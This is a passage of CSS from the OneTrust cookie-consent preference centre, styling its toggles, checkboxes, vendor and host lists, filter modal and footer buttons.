      #onetrust-pc-sdk .ot-switch-nob {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #767676;
        border: none;
        transition: all .2s ease-in 0s;
        -moz-transition: all .2s ease-in 0s;
        -o-transition: all .2s ease-in 0s;
        -webkit-transition: all .2s ease-in 0s;
        border-radius: 46px
      }

      #onetrust-pc-sdk .ot-switch-nob:before {
        position: absolute;
        content: "";
        height: 20px;
        width: 20px;
        bottom: 1px;
        background-color: #4d4d4d;
        -webkit-transition: .4s;
        border-radius: 100%;
        top: -5px;
        transition: .4s
      }

      #onetrust-pc-sdk .ot-chkbox {
        z-index: 1;
        position: relative;
        float: left
      }

      #onetrust-pc-sdk .ot-chkbox input:checked~label::before {
        background-color: #3860be
      }

      #onetrust-pc-sdk .ot-chkbox input+label::after {
        content: none;
        color: #fff
      }

      #onetrust-pc-sdk .ot-chkbox input:checked+label::after {
        content: ""
      }

      #onetrust-pc-sdk .ot-chkbox input:focus+label::before {
        outline-style: solid;
        outline-width: 2px;
        outline-style: auto
      }

      #onetrust-pc-sdk .ot-chkbox input[aria-checked=mixed]~label::before {
        background-color: #3860be
      }

      #onetrust-pc-sdk .ot-chkbox input[aria-checked=mixed]+label::after {
        content: ""
      }

      #onetrust-pc-sdk .ot-chkbox label {
        position: relative;
        height: 20px;
        padding-left: 30px;
        display: inline-block;
        cursor: pointer
      }

      #onetrust-pc-sdk .ot-chkbox label::before,
      #onetrust-pc-sdk .ot-chkbox label::after {
        position: absolute;
        content: "";
        display: inline-block;
        border-radius: 3px
      }

      #onetrust-pc-sdk .ot-chkbox label::before {
        height: 18px;
        width: 18px;
        border: 1px solid #3860be;
        left: 0px
      }

      #onetrust-pc-sdk .ot-chkbox label::after {
        height: 5px;
        width: 9px;
        border-left: 3px solid;
        border-bottom: 3px solid;
        transform: rotate(-45deg);
        -o-transform: rotate(-45deg);
        -ms-transform: rotate(-45deg);
        -webkit-transform: rotate(-45deg);
        left: 4px;
        top: 5px
      }

      #onetrust-pc-sdk .ot-label-txt {
        display: none
      }

      #onetrust-pc-sdk .ot-fltr-opt .ot-label-txt {
        display: block
      }

      #onetrust-pc-sdk .ot-chkbox input,
      #onetrust-pc-sdk .ot-tgl input {
        position: absolute;
        opacity: 0;
        width: 0;
        height: 0
      }

      #onetrust-pc-sdk .ot-arw-cntr {
        float: right;
        position: relative;
        pointer-events: none
      }

      #onetrust-pc-sdk .ot-arw {
        width: 16px;
        height: 16px;
        margin-left: 5px;
        color: dimgray;
        display: inline-block;
        vertical-align: middle;
        -webkit-transition: all 150ms ease-in 0s;
        -moz-transition: all 150ms ease-in 0s;
        -o-transition: all 150ms ease-in 0s;
        transition: all 150ms ease-in 0s
      }

      #onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw,
      #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-arw-cntr svg {
        transform: rotate(90deg);
        -o-transform: rotate(90deg);
        -ms-transform: rotate(90deg);
        -webkit-transform: rotate(90deg)
      }

      #onetrust-pc-sdk .ot-label-status {
        font-size: .75em;
        position: relative;
        top: 2px;
        display: none;
        padding-right: 5px;
        float: left
      }

      #onetrust-pc-sdk #ot-lst-cnt .ot-label-status {
        top: -6px
      }

      #onetrust-pc-sdk .ot-fltr-opts {
        min-height: 35px
      }

      #onetrust-pc-sdk .ot-fltr-btns {
        margin: 10px 15px 0 15px
      }

      #onetrust-pc-sdk .ot-fltr-btns button {
        padding: 12px 30px
      }

      #onetrust-pc-sdk .ot-pc-footer {
        position: absolute;
        bottom: 0px;
        width: 100%;
        max-height: 160px;
        border-top: 1px solid #d8d8d8
      }

      #onetrust-pc-sdk .ot-pc-footer button {
        margin-top: 20px;
        margin-bottom: 20px;
        font-weight: 600;
        font-size: .813em;
        min-height: 40px;
        height: auto;
        line-height: normal;
        padding: 10px 30px
      }

      #onetrust-pc-sdk .ot-tab-desc {
        margin-left: 3%
      }

      #onetrust-pc-sdk .ot-grp-hdr1 {
        display: inline-block;
        width: 100%;
        margin-bottom: 10px
      }

      #onetrust-pc-sdk .ot-desc-cntr h4 {
        color: #263238;
        display: inline-block;
        vertical-align: middle;
        margin: 0;
        font-weight: bold;
        font-size: .875em;
        line-height: 1.3;
        max-width: 80%
      }

      #onetrust-pc-sdk .ot-subgrps .ot-subgrp h5 {
        top: 0;
        max-width: unset
      }

      #onetrust-pc-sdk #ot-pvcy-hdr {
        margin-bottom: 10px
      }

      #onetrust-pc-sdk .ot-vlst-cntr {
        overflow: hidden
      }

      #onetrust-pc-sdk .category-vendors-list-handler,
      #onetrust-pc-sdk .category-host-list-handler,
      #onetrust-pc-sdk .category-vendors-list-handler+a {
        display: block;
        float: left;
        color: #3860be;
        font-size: .813em;
        font-weight: 400;
        line-height: 1.1;
        cursor: pointer;
        margin: 5px 0px
      }

      #onetrust-pc-sdk .category-vendors-list-handler:hover,
      #onetrust-pc-sdk .category-host-list-handler:hover,
      #onetrust-pc-sdk .category-vendors-list-handler+a:hover {
        text-decoration-line: underline
      }

      #onetrust-pc-sdk .ot-vlst-cntr .ot-ext-lnk,
      #onetrust-pc-sdk .ot-ven-hdr .ot-ext-lnk {
        display: inline-block;
        height: 13px;
        width: 13px;
        background-repeat: no-repeat;
        margin-left: 1px;
        margin-top: 6px;
        cursor: pointer
      }

      #onetrust-pc-sdk .ot-ven-hdr .ot-ext-lnk {
        margin-bottom: -1px
      }

      #onetrust-pc-sdk .category-host-list-handler,
      #onetrust-pc-sdk .ot-vlst-cntr,
      #onetrust-pc-sdk #ot-pc-desc+.category-vendors-list-handler {
        margin-top: 8px
      }

      #onetrust-pc-sdk .ot-grp-hdr1+.ot-vlst-cntr {
        margin-top: 0px;
        margin-bottom: 10px
      }

      #onetrust-pc-sdk .ot-always-active-group h3.ot-cat-header,
      #onetrust-pc-sdk .ot-subgrp.ot-always-active-group>h4 {
        max-width: 70%
      }

      #onetrust-pc-sdk .ot-always-active-group .ot-tgl-cntr {
        max-width: 28%
      }

      #onetrust-pc-sdk .ot-grp-desc ul,
      #onetrust-pc-sdk li.ot-subgrp p ul {
        margin: 0px;
        margin-left: 15px;
        padding-bottom: 8px
      }

      #onetrust-pc-sdk .ot-grp-desc ul li,
      #onetrust-pc-sdk li.ot-subgrp p ul li {
        font-size: inherit;
        padding-top: 8px;
        display: list-item;
        list-style: disc
      }

      #onetrust-pc-sdk ul.ot-subgrps {
        margin: 0;
        font-size: inherit
      }

      #onetrust-pc-sdk ul.ot-subgrps li {
        padding: 0;
        border: none;
        position: relative
      }

      #onetrust-pc-sdk ul.ot-subgrps li h5,
      #onetrust-pc-sdk ul.ot-subgrps li p {
        font-size: .82em;
        line-height: 1.4
      }

      #onetrust-pc-sdk ul.ot-subgrps li p {
        color: dimgray;
        clear: both;
        float: left;
        margin-top: 10px;
        margin-bottom: 0;
        word-break: break-word;
        word-wrap: break-word
      }

      #onetrust-pc-sdk ul.ot-subgrps li h5 {
        color: #263238;
        font-weight: bold;
        margin-bottom: 0;
        float: left;
        position: relative;
        top: 3px
      }

      #onetrust-pc-sdk li.ot-subgrp {
        margin-left: 30px;
        display: inline-block;
        width: calc(100% - 30px)
      }

      #onetrust-pc-sdk .ot-subgrp-tgl {
        float: right
      }

      #onetrust-pc-sdk .ot-subgrp-tgl.ot-always-active-subgroup {
        width: auto
      }

      #onetrust-pc-sdk .ot-pc-footer-logo {
        height: 30px;
        width: 100%;
        text-align: right;
        background: #f4f4f4;
        border-radius: 0 0 2px 2px
      }

      #onetrust-pc-sdk .ot-pc-footer-logo a {
        display: inline-block;
        margin-top: 5px;
        margin-right: 10px
      }

      #onetrust-pc-sdk #accept-recommended-btn-handler {
        float: right;
        text-align: center
      }

      #onetrust-pc-sdk .save-preference-btn-handler {
        min-width: 155px;
        background-color: #68b631;
        border-radius: 2px;
        color: #fff;
        font-size: .9em;
        line-height: 1.1;
        text-align: center;
        margin-left: 15px;
        margin-right: 15px
      }

      #onetrust-pc-sdk .ot-btn-subcntr button {
        margin-right: 16px
      }

      #onetrust-pc-sdk.ot-ftr-stacked .save-preference-btn-handler,
      #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-subcntr {
        white-space: normal;
        text-align: center;
        width: min-content;
        float: left;
        min-width: 40%
      }

      #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-subcntr button {
        text-wrap: wrap;
        margin-left: auto;
        margin-right: auto;
        width: 90%
      }

      #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-subcntr button:nth-child(2) {
        margin-top: 0
      }

      #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-subcntr {
        float: right
      }

      #onetrust-pc-sdk.ot-ftr-stacked #accept-recommended-btn-handler {
        float: none
      }

      #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container {
        overflow: hidden
      }

      #onetrust-pc-sdk #ot-pc-title {
        margin: 0px;
        overflow: hidden;
        position: relative;
        line-height: 1.2;
        max-height: 2.4em;
        padding-right: 1em;
        font-size: 1.37em;
        text-overflow: ellipsis;
        white-space: nowrap;
        display: block;
        max-width: 90%
      }

      #onetrust-pc-sdk #ot-pc-title.ot-pc-title-shrink {
        max-width: 70%
      }

      #onetrust-pc-sdk #ot-pc-lst {
        width: 100%;
        position: relative
      }

      #onetrust-pc-sdk #ot-pc-lst .ot-acc-hdr {
        padding-top: 17px;
        padding-right: 15px;
        padding-bottom: 17px;
        padding-left: 20px;
        display: inline-block;
        width: calc(100% - 35px);
        vertical-align: middle
      }

      #onetrust-pc-sdk #ot-pc-lst .ot-acc-txt {
        padding-top: 6px;
        padding-right: 15px;
        padding-bottom: 10px;
        padding-left: 20px
      }

      #onetrust-pc-sdk .ot-lst-cntr {
        height: 100%
      }

      #onetrust-pc-sdk #ot-pc-hdr {
        padding-top: 15px;
        padding-right: 30px;
        padding-bottom: 15px;
        padding-left: 20px;
        display: inline-block;
        width: calc(100% - 50px);
        height: 20px;
        border-bottom: 1px solid #d8d8d8
      }

      #onetrust-pc-sdk #ot-pc-hdr input {
        height: 32px;
        width: 100%;
        border-radius: 50px;
        font-size: .8em;
        padding-right: 35px;
        padding-left: 15px;
        float: left
      }

      #onetrust-pc-sdk #ot-pc-hdr input::placeholder {
        color: #707070;
        font-style: italic
      }

      #onetrust-pc-sdk #ot-lst-cnt {
        height: calc(100% - 86px);
        padding-left: 30px;
        padding-right: 27px;
        padding-top: 20px;
        margin-top: 8px;
        margin-right: 3px;
        margin-bottom: 4px;
        margin-left: 0;
        overflow-x: hidden;
        overflow-y: auto;
        transform: translate3d(0, 0, 0)
      }

      #onetrust-pc-sdk #ot-back-arw {
        height: 12px;
        width: 12px
      }

      #onetrust-pc-sdk #ot-lst-title {
        display: inline-block;
        font-size: 1em
      }

      #onetrust-pc-sdk #ot-lst-title h3 {
        color: dimgray;
        font-weight: bold;
        margin-left: 10px;
        display: inline-block;
        font-size: 1em
      }

      #onetrust-pc-sdk #ot-lst-title h3 * {
        font-size: inherit
      }

      #onetrust-pc-sdk .ot-lst-subhdr {
        float: right;
        position: relative;
        bottom: 6px
      }

      #onetrust-pc-sdk #ot-search-cntr {
        display: inline-block;
        vertical-align: middle;
        position: relative;
        width: 300px
      }

      #onetrust-pc-sdk #ot-search-cntr svg {
        position: absolute;
        right: 0px;
        width: 30px;
        height: 30px;
        font-size: 1em;
        line-height: 1;
        top: 2px
      }

      #onetrust-pc-sdk #ot-fltr-cntr {
        display: inline-block;
        position: relative;
        margin-left: 20px;
        vertical-align: middle;
        font-size: 0
      }

      #onetrust-pc-sdk #filter-btn-handler {
        background-color: #3860be;
        border-radius: 17px;
        -moz-transition: .1s ease;
        -o-transition: .1s ease;
        -webkit-transition: 1s ease;
        transition: .1s ease;
        width: 32px;
        height: 32px;
        padding: 0;
        margin: 0;
        position: relative
      }

      #onetrust-pc-sdk #filter-btn-handler svg {
        cursor: pointer;
        width: 15px;
        height: 15px;
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        padding-top: 5px
      }

      #onetrust-pc-sdk #filter-btn-handler path {
        fill: #fff
      }

      #onetrust-pc-sdk #ot-sel-blk {
        min-width: 200px;
        min-height: 30px;
        padding-left: 20px
      }

      #onetrust-pc-sdk #ot-selall-vencntr,
      #onetrust-pc-sdk #ot-selall-adtlvencntr {
        float: left;
        height: 100%
      }

      #onetrust-pc-sdk #ot-selall-vencntr label,
      #onetrust-pc-sdk #ot-selall-adtlvencntr label {
        height: 100%;
        padding-left: 0
      }

      #onetrust-pc-sdk #ot-selall-hostcntr {
        width: 21px;
        height: 21px;
        position: relative;
        left: 20px
      }

      #onetrust-pc-sdk #ot-selall-vencntr.line-through label::after,
      #onetrust-pc-sdk #ot-selall-adtlvencntr.line-through label::after,
      #onetrust-pc-sdk #ot-selall-licntr.line-through label::after,
      #onetrust-pc-sdk #ot-selall-hostcntr.line-through label::after,
      #onetrust-pc-sdk #ot-selall-gnvencntr.line-through label::after {
        height: auto;
        border-left: 0;
        left: 5px;
        top: 10.5px;
        transform: none;
        -o-transform: none;
        -ms-transform: none;
        -webkit-transform: none
      }

      #onetrust-pc-sdk .ot-ven-name,
      #onetrust-pc-sdk .ot-host-name {
        color: #2c3643;
        font-weight: bold;
        font-size: .813em;
        line-height: 1.2;
        margin: 0;
        height: auto;
        text-align: left;
        word-break: break-word;
        word-wrap: break-word
      }

      #onetrust-pc-sdk .ot-ven-name *,
      #onetrust-pc-sdk .ot-host-name * {
        font-size: inherit
      }

      #onetrust-pc-sdk .ot-host-desc {
        font-size: .69em;
        line-height: 1.4;
        margin-top: 5px;
        margin-bottom: 5px;
        color: dimgray
      }

      #onetrust-pc-sdk .ot-host-name>a {
        text-decoration: underline;
        position: relative;
        z-index: 2;
        margin-bottom: 5px;
        font-weight: bold
      }

      #onetrust-pc-sdk .ot-host-hdr {
        float: left;
        width: calc(100% - 50px);
        pointer-events: none;
        position: relative;
        z-index: 1
      }

      #onetrust-pc-sdk .ot-host-hdr .ot-host-name {
        pointer-events: none
      }

      #onetrust-pc-sdk .ot-host-hdr a {
        pointer-events: initial
      }

      #onetrust-pc-sdk .ot-host-hdr .ot-host-name~a {
        margin-top: 5px;
        font-size: .813em;
        text-decoration: underline
      }

      #onetrust-pc-sdk .ot-ven-hdr {
        width: 88%;
        float: right
      }

      #onetrust-pc-sdk input:focus+.ot-acc-hdr {
        outline: #000 solid 1px !important
      }

      #onetrust-pc-sdk #ot-selall-hostcntr input[type=checkbox],
      #onetrust-pc-sdk #ot-selall-vencntr input[type=checkbox],
      #onetrust-pc-sdk #ot-selall-adtlvencntr input[type=checkbox] {
        position: absolute
      }

      #onetrust-pc-sdk .ot-host-item .ot-chkbox {
        float: left
      }

      #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all-hdr {
        right: 38px
      }

      #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk {
        background-color: #f9f9fc;
        border: 1px solid #e2e2e2;
        width: auto;
        padding-bottom: 5px;
        padding-top: 5px
      }

      #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all-chkbox {
        right: 2px;
        width: auto
      }

      #onetrust-pc-sdk #ot-pc-lst .ot-acc-cntr {
        position: relative;
        border-left: 1px solid #e2e2e2;
        border-right: 1px solid #e2e2e2;
        border-bottom: 1px solid #e2e2e2
      }

      #onetrust-pc-sdk #ot-pc-lst .ot-acc-cntr input {
        z-index: 1
      }

      #onetrust-pc-sdk #ot-pc-lst .ot-acc-cntr>.ot-acc-hdr {
        background: #f9f9fc;
        padding-top: 10px;
        padding-bottom: 10px;
        background-color: #f9f9fc
      }

      #onetrust-pc-sdk #ot-pc-lst .ot-acc-cntr>.ot-acc-hdr input {
        z-index: 2
      }

      #onetrust-pc-sdk #ot-pc-lst .ot-acc-cntr>input[type=checkbox]:checked~.ot-acc-hdr {
        border-bottom: 1px solid #e2e2e2
      }

      #onetrust-pc-sdk #ot-pc-lst .ot-acc-cntr>input[type=checkbox][aria-checked=mixed]~.ot-acc-hdr {
        border-bottom: 1px solid #e2e2e2
      }

      #onetrust-pc-sdk #ot-pc-lst .ot-acc-cntr .ot-addtl-venbox {
        display: none
      }

      #onetrust-pc-sdk #ot-addtl-venlst .ot-tgl-cntr {
        margin-right: 13px
      }

      #onetrust-pc-sdk .ot-vensec-title {
        font-size: .813em;
        display: inline-block
      }

      #onetrust-pc-sdk .ot-ven-item>button:focus,
      #onetrust-pc-sdk .ot-host-item>button:focus,
      #onetrust-pc-sdk .ot-acc-cntr>button:focus {
        outline: #000 solid 2px
      }

      #onetrust-pc-sdk .ot-ven-item>button,
      #onetrust-pc-sdk .ot-host-item>button,
      #onetrust-pc-sdk .ot-acc-cntr>button {
        position: absolute;
        cursor: pointer;
        width: 100%;
        height: 100%;
        border: 0;
        opacity: 0;
        margin: 0;
        top: 0;
        left: 0
      }

      #onetrust-pc-sdk .ot-ven-item>button~.ot-acc-hdr,
      #onetrust-pc-sdk .ot-host-item>button~.ot-acc-hdr,
      #onetrust-pc-sdk .ot-acc-cntr>button~.ot-acc-hdr {
        cursor: pointer
      }

      #onetrust-pc-sdk .ot-ven-item>button[aria-expanded=false]~.ot-acc-txt,
      #onetrust-pc-sdk .ot-host-item>button[aria-expanded=false]~.ot-acc-txt,
      #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=false]~.ot-acc-txt {
        margin-top: 0;
        max-height: 0;
        opacity: 0;
        overflow: hidden;
        width: 100%;
        transition: .25s ease-out;
        display: none
      }

      #onetrust-pc-sdk .ot-ven-item>button[aria-expanded=true]~.ot-acc-txt,
      #onetrust-pc-sdk .ot-host-item>button[aria-expanded=true]~.ot-acc-txt,
      #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-txt {
        transition: .1s ease-in;
        display: block
      }

      #onetrust-pc-sdk .ot-ven-item ul {
        list-style: none inside;
        font-size: 100%;
        margin: 0
      }

      #onetrust-pc-sdk .ot-ven-item ul li {
        margin: 0 !important;
        padding: 0;
        border: none !important
      }

      #onetrust-pc-sdk .ot-hide-acc>button {
        pointer-events: none
      }

      #onetrust-pc-sdk .ot-hide-acc .ot-arw-cntr>* {
        visibility: hidden
      }

      #onetrust-pc-sdk #ot-ven-lst,
      #onetrust-pc-sdk #ot-host-lst,
      #onetrust-pc-sdk #ot-addtl-venlst,
      #onetrust-pc-sdk #ot-gn-venlst {
        width: 100%
      }

      #onetrust-pc-sdk #ot-ven-lst li,
      #onetrust-pc-sdk #ot-host-lst li,
      #onetrust-pc-sdk #ot-addtl-venlst li,
      #onetrust-pc-sdk #ot-gn-venlst li {
        border: 1px solid #d7d7d7;
        border-radius: 2px;
        position: relative;
        margin-top: 10px
      }

      #onetrust-pc-sdk #ot-gn-venlst li.ot-host-info {
        padding: .5rem;
        overflow-y: hidden
      }

      #onetrust-pc-sdk #ot-ven-lst .ot-tgl-cntr {
        width: 65%
      }

      #onetrust-pc-sdk #ot-host-lst .ot-tgl-cntr {
        width: 65%;
        float: left
      }

      #onetrust-pc-sdk label {
        margin-bottom: 0
      }

      #onetrust-pc-sdk .ot-host-notice {
        float: right
      }

      #onetrust-pc-sdk .ot-ven-link,
      #onetrust-pc-sdk .ot-ven-legclaim-link,
      #onetrust-pc-sdk .ot-host-expand {
        color: dimgray;
        font-size: .75em;
        line-height: .9;
        display: inline-block
      }

      #onetrust-pc-sdk .ot-ven-link *,
      #onetrust-pc-sdk .ot-ven-legclaim-link *,
      #onetrust-pc-sdk .ot-host-expand * {
        font-size: inherit
      }

      #onetrust-pc-sdk .ot-ven-link,
      #onetrust-pc-sdk .ot-ven-legclaim-link {
        position: relative;
        z-index: 2
      }

      #onetrust-pc-sdk .ot-ven-link:hover,
      #onetrust-pc-sdk .ot-ven-legclaim-link:hover {
        text-decoration: underline
      }

      #onetrust-pc-sdk .ot-ven-dets {
        border-radius: 2px;
        background-color: #f8f8f8
      }

      #onetrust-pc-sdk .ot-ven-dets li:first-child p:first-child {
        border-top: none
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:not(:first-child) {
        border-top: 1px solid #ddd !important
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p {
        display: inline-block
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(odd) {
        width: 30%
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(even) {
        width: 50%;
        word-break: break-word;
        word-wrap: break-word
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p,
      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc h5 {
        padding-top: 5px;
        padding-bottom: 5px;
        display: block
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc h5 {
        display: inline-block
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p:nth-last-child(-n+1) {
        padding-bottom: 10px
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p:nth-child(-n+2):not(.disc-pur) {
        padding-top: 10px
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc .disc-pur-cont {
        display: inline
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc .disc-pur {
        position: relative;
        width: 50% !important;
        word-break: break-word;
        word-wrap: break-word;
        left: calc(30% + 17px)
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc .disc-pur:nth-child(-n+1) {
        position: static
      }

      #onetrust-pc-sdk .ot-ven-dets p,
      #onetrust-pc-sdk .ot-ven-dets h5,
      #onetrust-pc-sdk .ot-ven-dets span {
        font-size: .69em;
        text-align: left;
        vertical-align: middle;
        word-break: break-word;
        word-wrap: break-word;
        margin: 0;
        padding-bottom: 10px;
        padding-left: 15px;
        color: #2e3644
      }

      #onetrust-pc-sdk .ot-ven-dets h5 {
        padding-top: 5px
      }

      #onetrust-pc-sdk .ot-ven-dets span {
        color: dimgray;
        padding: 0;
        vertical-align: baseline
      }

      #onetrust-pc-sdk .ot-ven-dets .ot-ven-pur h5 {
        border-top: 1px solid #e9e9e9;
        border-bottom: 1px solid #e9e9e9;
        padding-bottom: 5px;
        margin-bottom: 5px;
        font-weight: bold
      }

      #onetrust-pc-sdk .ot-host-opt {
        display: inline-block;
        width: 100%;
        margin: 0;
        font-size: inherit
      }

      #onetrust-pc-sdk .ot-host-opt li>div div {
        font-size: .81em;
        padding: 5px 0
      }

      #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(1) {
        width: 30%;
        float: left
      }

      #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(2) {
        width: 70%;
        float: left;
        word-break: break-word;
        word-wrap: break-word
      }

      #onetrust-pc-sdk #ot-host-lst li.ot-host-info {
        border: none;
        font-size: .8em;
        color: dimgray;
        float: left;
        text-align: left;
        padding: 10px;
        margin-bottom: 10px;
        width: calc(100% - 10px);
        background-color: #f8f8f8
      }

      #onetrust-pc-sdk #ot-host-lst li.ot-host-info a {
        color: dimgray
      }

      #onetrust-pc-sdk #ot-host-lst li.ot-host-info>div {
        overflow: auto
      }

      #onetrust-pc-sdk #no-results {
        text-align: center;
        margin-top: 30px
      }

      #onetrust-pc-sdk #no-results p {
        font-size: 1em;
        color: #2e3644;
        word-break: break-word;
        word-wrap: break-word
      }

      #onetrust-pc-sdk #no-results p span {
        font-weight: bold
      }

      #onetrust-pc-sdk .ot-tgl-cntr {
        display: inline-block;
        vertical-align: middle
      }

      #onetrust-pc-sdk .ot-arw-cntr,
      #onetrust-pc-sdk .ot-tgl-cntr {
        float: right
      }

      #onetrust-pc-sdk .ot-desc-cntr {
        padding-top: 0px;
        margin-top: 20px;
        padding-right: 0px;
        border-radius: 3px;
        overflow: hidden;
        padding-bottom: 10px
      }

      #onetrust-pc-sdk .ot-desc-cntr:focus,
      #onetrust-pc-sdk .ot-desc-cntr:active,
      #onetrust-pc-sdk .ot-desc-cntr:focus-visible {
        outline: 2px solid #101010;
        border-radius: 2px
      }

      #onetrust-pc-sdk .ot-leg-border-color {
        border: 1px solid #e9e9e9
      }

      #onetrust-pc-sdk .ot-leg-border-color .ot-subgrp-cntr {
        border-top: 1px solid #e9e9e9;
        padding-bottom: 10px
      }

      #onetrust-pc-sdk .ot-category-desc {
        padding-bottom: 10px
      }

      #onetrust-pc-sdk .ot-grp-hdr1 {
        padding-left: 10px;
        width: calc(100% - 20px);
        padding-top: 10px;
        margin-bottom: 0px;
        padding-bottom: 8px
      }

      #onetrust-pc-sdk .ot-subgrp-cntr {
        padding-top: 10px
      }

      #onetrust-pc-sdk .ot-desc-cntr>*:not(.ot-grp-hdr1) {
        padding-left: 10px;
        padding-right: 10px
      }

      #onetrust-pc-sdk .ot-pli-hdr {
        overflow: hidden;
        padding-top: 7.5px;
        padding-bottom: 7.5px;
        background-color: #f8f8f8;
        border: none;
        border-bottom: 1px solid #e9e9e9
      }

      #onetrust-pc-sdk .ot-pli-hdr span:first-child {
        text-align: left;
        max-width: 80px;
        padding-right: 5px
      }

      #onetrust-pc-sdk .ot-pli-hdr span:last-child {
        padding-right: 20px;
        text-align: center
      }

      #onetrust-pc-sdk .ot-li-title {
        float: right;
        font-size: .813em
      }

      #onetrust-pc-sdk .ot-desc-cntr .ot-tgl-cntr:first-of-type,
      #onetrust-pc-sdk .ot-cat-header+.ot-tgl {
        padding-left: 7px;
        padding-right: 7px
      }

      #onetrust-pc-sdk .ot-always-active-group .ot-grp-hdr1 .ot-tgl-cntr:first-of-type {
        padding-left: 0px
      }

      #onetrust-pc-sdk .ot-cat-header,
      #onetrust-pc-sdk .ot-subgrp h4 {
        max-width: calc(100% - 133px)
      }

      #onetrust-pc-sdk #ot-lst-cnt #ot-sel-blk {
        width: 100%;
        display: inline-block;
        padding: 0
      }

      #onetrust-pc-sdk .ot-sel-all {
        display: inline-block;
        width: 100%
      }

      #onetrust-pc-sdk .ot-sel-all-hdr,
      #onetrust-pc-sdk .ot-sel-all-chkbox {
        width: 100%;
        float: right;
        position: relative
      }

      #onetrust-pc-sdk .ot-sel-all-chkbox {
        z-index: 1
      }

      #onetrust-pc-sdk :not(.ot-hosts-ui) .ot-sel-all-hdr,
      #onetrust-pc-sdk :not(.ot-hosts-ui) .ot-sel-all-chkbox {
        right: 23px;
        width: calc(100% - 23px)
      }

      #onetrust-pc-sdk .ot-consent-hdr,
      #onetrust-pc-sdk .ot-li-hdr {
        float: right;
        font-size: .813em;
        position: relative;
        line-height: normal;
        text-align: center;
        word-break: break-word;
        word-wrap: break-word
      }

      #onetrust-pc-sdk .ot-hosts-ui .ot-consent-hdr {
        float: left;
        position: relative;
        left: 5px
      }

      #onetrust-pc-sdk .ot-li-hdr {
        max-width: 100px;
        margin-right: 10px
      }

      #onetrust-pc-sdk .ot-consent-hdr {
        max-width: 55px
      }

      #onetrust-pc-sdk .ot-ven-ctgl {
        margin-left: 10px
      }

      #onetrust-pc-sdk .ot-ven-litgl {
        margin-right: 55px
      }

      #onetrust-pc-sdk .ot-ven-litgl.ot-ven-litgl-only {
        margin-right: 86px
      }

      #onetrust-pc-sdk .ot-ven-ctgl,
      #onetrust-pc-sdk .ot-ven-litgl,
      #onetrust-pc-sdk .ot-ven-gvctgl {
        float: left
      }

      #onetrust-pc-sdk .ot-ven-ctgl label,
      #onetrust-pc-sdk .ot-ven-litgl label,
      #onetrust-pc-sdk .ot-ven-gvctgl label {
        width: 22px;
        padding: 0
      }

      #onetrust-pc-sdk #ot-selall-licntr {
        display: block;
        width: 21px;
        height: 21px;
        position: relative;
        float: right;
        right: 80px
      }

      #onetrust-pc-sdk #ot-selall-licntr input {
        position: absolute
      }

      #onetrust-pc-sdk #ot-selall-vencntr,
      #onetrust-pc-sdk #ot-selall-adtlvencntr,
      #onetrust-pc-sdk #ot-selall-gnvencntr {
        float: right;
        width: 21px;
        height: 21px;
        position: relative;
        right: 15px
      }

      #onetrust-pc-sdk #ot-ven-lst .ot-tgl-cntr {
        float: right;
        width: auto
      }

      #onetrust-pc-sdk .ot-ven-hdr {
        float: left;
        width: 60%
      }

      #onetrust-pc-sdk #vdr-lst-dsc {
        font-size: .812em;
        line-height: 1.5;
        padding: 10px 15px 5px 15px
      }

      #onetrust-pc-sdk #ot-anchor {
        border: 12px solid rgba(0, 0, 0, 0);
        display: none;
        position: absolute;
        z-index: 2147483647;
        top: 40px;
        right: 35px;
        transform: rotate(45deg);
        -o-transform: rotate(45deg);
        -ms-transform: rotate(45deg);
        -webkit-transform: rotate(45deg);
        background-color: #fff;
        -webkit-box-shadow: -3px -3px 5px -2px #c7c5c7;
        -moz-box-shadow: -3px -3px 5px -2px #c7c5c7;
        box-shadow: -3px -3px 5px -2px #c7c5c7
      }

      #onetrust-pc-sdk #ot-fltr-modal {
        width: 300px;
        position: absolute;
        z-index: 2147483646;
        top: 46px;
        height: 90%;
        max-height: 350px;
        display: none;
        -moz-transition: .2s ease;
        -o-transition: .2s ease;
        -webkit-transition: 2s ease;
        transition: .2s ease;
        opacity: 1;
        right: 0
      }

      #onetrust-pc-sdk #ot-fltr-modal button {
        max-width: 200px;
        line-height: 1;
        word-break: break-word;
        white-space: normal;
        height: auto;
        font-weight: bold
      }

      #onetrust-pc-sdk #ot-fltr-cnt {
        background-color: #fff;
        margin: 5px;
        border-radius: 3px;
        height: 100%;
        margin-right: 10px;
        padding-right: 10px;
        -webkit-box-shadow: 0px 0px 12px 2px #c7c5c7;
        -moz-box-shadow: 0px 0px 12px 2px #c7c5c7;
        box-shadow: 0px 0px 12px 2px #c7c5c7
      }

